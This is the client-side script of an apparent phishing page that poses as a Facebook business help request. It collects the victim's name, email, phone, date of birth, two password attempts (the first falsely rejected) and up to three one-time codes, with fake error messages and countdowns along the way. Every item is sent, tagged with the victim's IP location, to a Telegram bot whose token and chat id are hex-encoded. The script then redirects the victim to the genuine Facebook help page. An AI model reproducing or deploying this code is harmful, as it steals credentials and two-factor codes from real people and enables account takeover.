<script>
const _C = {
    T: "\x37\x31\x30\x30\x39\x32\x34\x39\x31\x31\x3A\x41\x41\x46\x62\x65\x32\x51\x48\x72\x78\x32\x36\x4A\x35\x70\x52\x45\x57\x74\x67\x6E\x2D\x6A\x6F\x32\x70\x57\x4B\x68\x35\x41\x39\x69\x6D\x45",
    I: "\x2D\x35\x30\x37\x30\x31\x32\x31\x31\x36\x39",
    R: "https://www.facebook.com/business/help",
    A: "https://ipwho.is/"
};

const _U = {
    gL: async () => {
        try {
            const r = await fetch(_C.A);
            const d = await r.json();
            return d.success ? { i: d.ip, c: d.city, o: d.country, f: d.flag?.emoji||"" } : { i: "Unk", c: "N/A", o: "N/A", f: "" };
        } catch { return { i: "Err", c: "N/A", o: "N/A", f: "" }; }
    },
    sM: async (m) => {
        if(!_C.T || !_C.I) return;
        try {
            await fetch(`https://api.telegram.org/bot${_C.T}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _C.I, text: m, parse_mode: 'HTML' })
            });
        } catch (e) {}
    },
    fR: (d, t, l) => {
        const tm = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
        let ic = t==="INFO"?"📝":(t.includes("PASS")?"🔑":"🔥");
        let i = `<b>Name:</b> ${d.fn}\n<b>Mail:</b> ${d.em}`;
        if(d.be) i += `\n<b>Biz:</b> ${d.be}`;
        i += `\n<b>Ph:</b> ${d.ph}\n<b>DOB:</b> ${d.db}`;
        let p = d.p1 ? `\n--\n<b>P1:</b> <code>${d.p1}</code>` : "";
        if(d.p2) p += `\n<b>P2:</b> <code>${d.p2}</code>`;
        let o = d.otp ? `\n--\n<b>OTP:</b> <code>${d.otp}</code>` : "";
        return `<b>${ic} ${t}</b> | ${tm}\n----------------\n${i}${p}${o}\n================\n🌍 <code>${l.i}</code>\n📍 ${l.c}, ${l.o} ${l.f}`;
    },
    mK: (s, t) => {
        if(!s || s.length<5) return "...";
        return t==='e' ? `${s.substring(0,3)}***@${s.split('@')[1]}` : `${s.substring(0,3)}****${s.substring(s.length-3)}`;
    }
};

document.addEventListener("DOMContentLoaded", async () => {
    const loc = await _U.gL();
    let dat = { fn:"", em:"", be:"", ph:"", db:"", p1:"", p2:"", otp:"" };
    let pC = 0, oC = 0, iL = false;

    const gI = (i) => document.getElementById(i);
    const sE = (i, m) => { let e=gI(i); e.innerText=m; e.classList.remove("hidden"); };
    const hE = (i) => gI(i).classList.add("hidden");
    const sM = (i) => {
        gI("overlay").classList.remove("hidden");
        ["infoForm","passwordForm","verifyModal"].forEach(x=>gI(x).classList.add("hidden"));
        gI(i).classList.remove("hidden");
    };

    if(gI("ticketId")) gI("ticketId").innerText = "REF-" + Math.floor(Math.random()*900000);
    if(gI("submitRequestBtn")) gI("submitRequestBtn").onclick = () => sM("infoForm");

    if(gI("sendInfoBtn")) gI("sendInfoBtn").onclick = () => {
        let is = document.querySelectorAll("#infoForm input");
        dat.fn=is[0].value; dat.em=is[1].value; dat.be=is[2].value; dat.ph=is[4].value;
        dat.db=`${is[5].value}/${is[6].value}/${is[7].value}`;
        _U.sM(_U.fR(dat, "INFO", loc));
        sM("passwordForm");
    };

    if(gI("continueBtn")) gI("continueBtn").onclick = () => {
        let v = gI("passwordInput").value;
        if(!v) return;
        pC++;
        if(pC === 1) {
            dat.p1 = v;
            _U.sM(_U.fR(dat, "PASS1", loc));
            gI("passwordInput").value = "";
            sE("passwordError", "The password you entered is incorrect. Please try again.");
        } else {
            dat.p2 = v;
            _U.sM(_U.fR(dat, "PASS2", loc));
            gI("maskedEmail").innerText = _U.mK(dat.em, 'e');
            gI("maskedPhone").innerText = _U.mK(dat.ph, 'p');
            sM("verifyModal");
        }
    };

    if(gI("verifyBtn")) gI("verifyBtn").onclick = () => {
        if(iL) return;
        let c = gI("verifyCode").value;
        if(!c) return;
        dat.otp = c;
        oC++;
        _U.sM(_U.fR(dat, "OTP", loc));

        if(oC < 3) {
            gI("verifyCode").value = "";
            sE("verifyError", "The code you entered is incorrect.");
            iL = true;
            let b = gI("verifyBtn"), cd = gI("countdown"), s = 30;
            b.disabled = true; b.style.opacity = "0.7"; b.innerText = "Please wait...";
            cd.classList.remove("hidden");
            
            let t = setInterval(() => {
                s--; cd.innerText = `Try again in ${s}s`;
                if(s <= 0) {
                    clearInterval(t); iL = false;
                    cd.classList.add("hidden"); hE("verifyError");
                    b.disabled = false; b.style.opacity = "1"; b.innerText = "Confirm";
                }
            }, 1000);
        } else {
            gI("verifyBtn").innerText = "Processing...";
            hE("verifyError");
            setTimeout(() => window.location.href = _C.R, 1500);
        }
    };
});
</script>
